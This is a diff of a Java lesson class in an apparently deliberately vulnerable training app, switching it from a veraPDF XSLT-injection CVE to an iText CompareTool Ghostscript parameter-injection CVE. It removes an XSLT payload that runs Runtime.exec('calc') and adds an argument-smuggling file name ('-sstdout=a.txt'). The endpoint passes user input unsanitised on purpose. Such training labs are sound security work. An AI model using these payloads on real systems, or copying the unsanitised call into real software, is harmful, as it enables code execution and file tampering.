@@ -61,13 +61,14 @@ public class VulnerableITextPdfIOComponentsLesson extends AssignmentEndpoint {
 
   Logger log = LoggerFactory.getLogger(this.getClass().getName());
 
-  @PostMapping("/VulnerableITextPdfIOComponentsLesson/CVE-2024-28109")
+  @PostMapping("/VulnerableITextPdfIOComponentsLesson/CVE-2021-43113")
   public @ResponseBody AttackResult NacosYamlParser(
-      @RequestParam String payload,
-      @RequestParam(required = false, defaultValue = "true") Boolean isXsl) {
+      @RequestParam String pdffile1,
+      @RequestParam String pdffile2
+      ) {
     //// https://security.snyk.io/vuln/SNYK-JAVA-ORGVERAPDF-6513793 - CVE-2024-28109
 
-    log.info("VulnerableITextPdfIOComponentsLesson called with payload : {}", payload);
+    log.info("VulnerableITextPdfIOComponentsLesson called with payload : {}", pdffile2);
     try {
 
       // Parameter injection: javac -cp ".:*" Example.java; ITEXT_GS_EXEC=/usr/bin/gs java -cp ".:*"
@@ -76,7 +77,7 @@ public class VulnerableITextPdfIOComponentsLesson extends AssignmentEndpoint {
       // \0"
 
       CompareTool ct = new CompareTool();
-      String policyResultOss = ct.compareVisually("a.pdf", payload, ".", ".", null);
+      String policyResultOss = ct.compareVisually(pdffile1, pdffile2, ".", ".", null);
 
       if (policyResultOss.toString().contains("pid")) {
         return success(this)
@@ -93,52 +94,29 @@ public class VulnerableITextPdfIOComponentsLesson extends AssignmentEndpoint {
     }
 
     return failed(this)
-        .feedback("vulnerable-itextpdf-io-components.fromXML")
-        .feedbackArgs(payload)
+        .feedback("vulnerable-itextpdf-io-components.failed")
+        .feedbackArgs(pdffile2)
         .build();
   }
 
   public static void main(String[] args) {
     // String payload="";
-    String payload =
-        "<xsl:stylesheet version=\"1.0\"\r\n"
-            + "	xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\r\n"
-            + "	xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\"\r\n"
-            + "	xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\">\r\n"
-            + "	<xsl:template match=\"/\">\r\n"
-            + "		<xsl:variable name=\"rtobject\" select=\"rt:getRuntime()\" />\r\n"
-            + "		<xsl:variable name=\"process\" select=\"rt:exec($rtobject,'calc')\" />\r\n"
-            + "		<xsl:variable name=\"processString\"	select=\"ob:toString($process)\" />\r\n"
-            + "		<xsl:value-of select=\"$processString\" />\r\n"
-            + "	</xsl:template>\r\n"
-            + "</xsl:stylesheet>";
+    String payload = "xxx.pdf\" -sstdout=a.txt"; // DROPS a file called 'a.txt-%03d.png\ xxx.pdf\ -sstdout=a.txt' on the filesystem"
     boolean isXsl = true;
-    InputStream is = new ByteArrayInputStream(payload.getBytes(StandardCharsets.UTF_8));
-    OutputStream policyResultOss =
-        new OutputStream() {
-          StringBuilder sb = new StringBuilder();
+    System.out.println("Payload --> "+ payload);
+    CompareTool c = new CompareTool();
+   try{  
+    
+    String policyResultOss = c.compareVisually("a.pdf", payload, ".", ".", null);
 
-          @Override
-          public void write(int b) throws IOException {
-            this.sb.append((char) b);
-          }
+     System.out.println("Policy Result --> "+ policyResultOss);
+    
+    }catch(Exception ex){
 
-          public String toString() {
-            return this.sb.toString();
-          }
-        };
-    try {
-      PolicyChecker.applyPolicy(
-          new ByteArrayInputStream(payload.getBytes(StandardCharsets.UTF_8)),
-          is,
-          policyResultOss,
-          isXsl);
-    } catch (VeraPDFException e) {
-      // TODO Auto-generated catch block
-      e.printStackTrace();
-    }
+      System.out.println("Exception --> "+ ex.getMessage());      
 
-    System.out.println(" Output ---> " + policyResultOss);
+      }
+
     // payload = "<demo><demo>";
 
   }
